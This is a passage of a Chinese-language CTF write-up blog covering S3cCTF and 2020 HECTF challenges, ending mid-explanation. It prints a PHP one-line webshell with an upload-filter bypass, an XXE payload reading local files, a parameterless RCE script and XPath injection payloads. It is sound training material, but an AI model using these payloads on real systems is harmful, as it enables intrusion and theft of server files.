string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------计算算式"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------提交"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resultres <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum" loading="lazy"><p>本人蹩脚自学的python，语法规范问题请见谅</p><hr><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="出题解析-5"><a href="#出题解析-5" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察Linux下Vim的应用，同时考察PHP代码审计及robots协议</p><p>给了hint：vim强退会在当前目录生成生成备份文件</p><h3 id="解题方式-5"><a href="#解题方式-5" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开先看源代码</p><img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim" loading="lazy"><p>Recover<br>Linux中，如果vim强退的话（ctrl+z）就会在目录下生成备份文件，如图所示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z" loading="lazy"><p>而再vim编辑就会有如下提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re" loading="lazy"><p>直接Recover恢复即可。</p><p>根据提示，访问.&#x2F;.index.php.swp。发现下载.swp文件<br>这里注意，备份文件是隐藏文件，文件名前面有个点<br>拿去linux系统恢复，可以发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1" loading="lazy"><p>由此，flag分为多部分<br>接下来代码审计很简单，回到index.php，POST传参</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2" loading="lazy"><p>机器人会告诉你剩下的，联想robots协议，访问.&#x2F;robots.txt</p><img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots" loading="lazy"><p>可得flag在.&#x2F;r&#x2F;o&#x2F;b&#x2F;o&#x2F;a&#x2F;t&#x2F;s&#x2F;1.php</p><img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3" loading="lazy"><p>将三段flag组合即可</p><hr><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="出题解析-6"><a href="#出题解析-6" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察文件上传，考察上传绕过的姿势，因为比赛限制，没有出太难的过滤</p><h3 id="解题方式-6"><a href="#解题方式-6" class="headerlink" title="解题方式"></a>解题方式</h3><p>当然，不是真的让你上传个动图。。我服务器里发现了好多奇奇怪怪的图片<br>一般文件上传一句话木马直接获取shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>需要能被php解析才行，.txt,.gif都是不可被解析的<br>或者直接用script标签<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>后缀名限制</p><img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php" loading="lazy"><p>上传普通图片，被过滤</p><img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif" loading="lazy"><p>抓包上传,原始如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1" loading="lazy"><p>修改如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2" loading="lazy"><p>请求头检查：content-type，MIME类型限制，修改为<code>image/gif</code><br>文件后缀绕过：只要能被php解析的文件名就可以<br>这里我只限制了<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIME类型限制只允许<code>image/gif</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload" loading="lazy"><p>然后访问文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2" loading="lazy"><p>发现代码被执行了，直接蚁剑连上get shell</p><img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3" loading="lazy"><p>根目录发现flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4" loading="lazy"><p>你们真的传了一堆堆奇奇怪怪的图片。。。</p><hr><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="出题解析-7"><a href="#出题解析-7" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察XXE注入，即 XML实体注入</p><h3 id="解题方式-7"><a href="#解题方式-7" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开直接给phpinfo，源代码有提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint" loading="lazy"><p>底部发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system" loading="lazy"><p>其实是执行了<code>system(&quot;ls&quot;);</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index" loading="lazy"><p>然后每个文件都高亮了语法，<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。存在的XXE漏洞具体可以百度研究一下。<br>样例Payload：</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom" loading="lazy"><p>其实还可以利用写入一句话木马等操作。</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="信息搜索"><a href="#信息搜索" class="headerlink" title="信息搜索"></a>信息搜索</h2><h3 id="出题解析-8"><a href="#出题解析-8" class="headerlink" title="出题解析"></a>出题解析</h3><p>信息搜索也是门技术，好好利用搜索引擎可以达到事半功倍的效果.<br>确实，只要仔细搜索，没有任何问题</p><h3 id="解题方式-8"><a href="#解题方式-8" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开五道题，一道道解决</p><h4 id="1-截至2020年10月31日，RFC最新的正式文档编号是多少"><a href="#1-截至2020年10月31日，RFC最新的正式文档编号是多少" class="headerlink" title="1.截至2020年10月31日，RFC最新的正式文档编号是多少?"></a>1.截至2020年10月31日，RFC最新的正式文档编号是多少?</h4><p>RFC文档，Request For Comments，官网连<em>科学上网</em>都不需要</p><img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc" loading="lazy"><p>访问<code>https://www.ietf.org/</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc" loading="lazy"><p>或者直接访问RFC文档搜索网站<code>https://www.rfc-editor.org/search/rfc_search.php</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc" loading="lazy"><p>截至2020年10月31日，一查</p><img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc" loading="lazy"><p>最新为RFC8940<br>这种东西最标准还是去官网查</p><h4 id="2-国家网络安全宣传周第一届是在哪一年举行的？"><a href="#2-国家网络安全宣传周第一届是在哪一年举行的？" class="headerlink" title="2.国家网络安全宣传周第一届是在哪一年举行的？"></a>2.国家网络安全宣传周第一届是在哪一年举行的？</h4><p>2014</p><img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014" loading="lazy"><h4 id="3-本校校园卡上对应的教学楼是主校区的几号教学楼？"><a href="#3-本校校园卡上对应的教学楼是主校区的几号教学楼？" class="headerlink" title="3. 本校校园卡上对应的教学楼是主校区的几号教学楼？"></a>3. 本校校园卡上对应的教学楼是主校区的几号教学楼？</h4><p>拿出来看看…百度地图打开，</p><img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1" loading="lazy"><p>全景地图</p><img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1" loading="lazy"><p>有点老，仔细观察地图，只有1教有那么大地方，2教3教都不会有那么大的中央空地<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1" loading="lazy"><br>good</p><h4 id="4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"><a href="#4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？" class="headerlink" title="4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"></a>4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？</h4><p>33<br>招新PPT上写的，学校公众号也能查到</p><h4 id="5-截至目前最新的C语言标准是C多少？"><a href="#5-截至目前最新的C语言标准是C多少？" class="headerlink" title="5. 截至目前最新的C语言标准是C多少？"></a>5. 截至目前最新的C语言标准是C多少？</h4><p>18<br>C标准以年号结尾命名，有人问为什么不是C99,C11….我只能说，现在最新的是C18，百度好好查查吧…（2年了）</p><p>全部答对给flag，不行爆破也行</p><hr><h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="出题解析-9"><a href="#出题解析-9" class="headerlink" title="出题解析"></a>出题解析</h3><p>社工大佬，怕了怕了</p><h3 id="解题方式-9"><a href="#解题方式-9" class="headerlink" title="解题方式"></a>解题方式</h3><p>原本考爆破的，后来干脆直接你们社工算了…</p><img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id" loading="lazy"><p>打开去掉disable标签</p><img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id" loading="lazy"><p>下面提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id" loading="lazy"><p>原来想考爆破，最后都知道了…id是我学号，直接开始社工，索性改分类为MISC。<br>再给个hint：<code>计算机院 2019 懂？</code><br>首先2019级即前5位为<code>12019</code><br>计算机院为050-055(大概）<br>所以前八位<code>1201905x</code>，爆破一下就好了。<br>当然也有问学长学姐的，问墙的，翻我空间的，查学校名册的，都可以。这题就当玩玩233333<br>ID:12019054018</p><img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id" loading="lazy"><hr><h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="出题解析-10"><a href="#出题解析-10" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察工具利用以及查看属性</p><h3 id="解题方式-10"><a href="#解题方式-10" class="headerlink" title="解题方式"></a>解题方式</h3><p>小戈:give me a flag 一看属性竟然用 SteganPEG 而且还没那么简单</p><p>提示很明显，用软件 SteganPEG ，密码就是<code>givemeaflag</code>（生怕你们看不见），其实正规地方在文件的属性里</p><img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag" loading="lazy"><p>软件读文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag" loading="lazy"><p>拖出来打开就是flag</p><hr><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="出题解析-11"><a href="#出题解析-11" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察 学习理解能力 百度曼彻斯特编码</p><h3 id="解题方式-11"><a href="#解题方式-11" class="headerlink" title="解题方式"></a>解题方式</h3><p>大白话解释：低电平是0，高电平是1。<br>曼彻斯特编码<code>01-&gt;1</code> <code>10-&gt;0</code><br>当时出这题用的C写的，蹩脚的东西看看就好…</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token char">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token char">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token char">'0'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><p>得到<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>复制去二进制转字符，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man" loading="lazy"><hr><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="出题解析-12"><a href="#出题解析-12" class="headerlink" title="出题解析"></a>出题解析</h3><p>水题，考察知识面，和搜索…</p><h3 id="解题方式-12"><a href="#解题方式-12" class="headerlink" title="解题方式"></a>解题方式</h3><p>真的水题，搜索标题<code>SlientEye</code>，是的，这是个软件<br>默认设置解密，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient" loading="lazy"><hr><h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="出题解析-13"><a href="#出题解析-13" class="headerlink" title="出题解析"></a>出题解析</h3><p>写的很清楚，明文攻击<br>给了hint，暗示伪加密<br>开赛题坚持了这么久我没想到…</p><h3 id="解题方式-13"><a href="#解题方式-13" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开发现压缩包三文件全加密，压缩包里的注释</p><pre class="language-none"><code class="language-none">亲眼所见，亦非真实也许是虚伪的，也许需要AZPR</code></pre><p>明示软件AZPR，这是个爆破软件<br>伪加密百度有一篇很详细的文章<br>修改加密位为<code>00</code>，不知道哪个文件是伪加密直接所有加密位为<code>00</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00" loading="lazy"><p>保存后解压只有副本那个文件可以保存，其他两个文件是真加密</p><img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00" loading="lazy"><p>根据明文攻击方法，将这个文件打包zip然后去题目再下一遍原文件,此时文件被修改，也可以改回去</p><p>用AZPR选择明文攻击即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="在这里插入图片描述" loading="lazy"><p>可以看到密钥被恢复了，不用找密码了，直接可以保存</p><img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="在这里插入图片描述" loading="lazy"><p>保存文件，其实已经破解出来了</p><img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="在这里插入图片描述" loading="lazy"><p>或者用rbkcrack也可以<br>直接打开flag.txt得flag</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 HECTF Write-up</title>
      <link href="article/2020-HECTF-Write-up/"/>
      <url>article/2020-HECTF-Write-up/</url>
      
        <content type="html"><![CDATA[<h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p><img src="/article/2020-HECTF-Write-up/1.png" class="" title="first" loading="lazy"><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p><p>打开发现<code>nonono ，once again！</code></p><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名<span class="token operator">--</span><span class="token operator">></span></code></pre><p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL&#x3D;NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053" loading="lazy"><p>访问.&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">"/xxx"</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre><p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了&#x2F;etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p><p>&#96;&#96;.&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;crontab&#96;访问得</p><pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php</code></pre><p>很明显<code>/very_g00d_Y0u_got_it.php</code></p><p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p><p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187" loading="lazy"><p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p><img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943" loading="lazy"><p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p><pre class="language-none"><code class="language-none">Array(    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; .dockerenv    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg    [5] &#x3D;&gt; bin    [6] &#x3D;&gt; boot    [7] &#x3D;&gt; dev    [8] &#x3D;&gt; etc    [9] &#x3D;&gt; flag    [10] &#x3D;&gt; home    [11] &#x3D;&gt; index.php    [12] &#x3D;&gt; lib    [13] &#x3D;&gt; lib64    [14] &#x3D;&gt; media    [15] &#x3D;&gt; mnt    [16] &#x3D;&gt; opt    [17] &#x3D;&gt; proc    [18] &#x3D;&gt; root    [19] &#x3D;&gt; run    [20] &#x3D;&gt; sbin    [21] &#x3D;&gt; srv    [22] &#x3D;&gt; start.sh    [23] &#x3D;&gt; sys    [24] &#x3D;&gt; tmp    [25] &#x3D;&gt; usr    [26] &#x3D;&gt; var    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php)</code></pre><img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000" loading="lazy"><p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p><img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419" loading="lazy"><p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p><p>Payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p><p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p><img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941" loading="lazy"><p>输admin登陆一下</p><img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397" loading="lazy"><p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p><img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642" loading="lazy"><p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p><p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p><p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1&#x3D;1 并在 password 中输入：’ or 1&#x3D;1   就能绕过校验，成功获取所有user数据</p><p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p><p>具体不做阐述</p><hr><p><strong>尝试XPath盲注</strong></p><p>一般步骤如下:</p><p>1.判断根下节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 1</p><p>2.猜解第一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: root</p><p>3.判断root的下一级节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 2</p><p>4.猜解root的下一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or 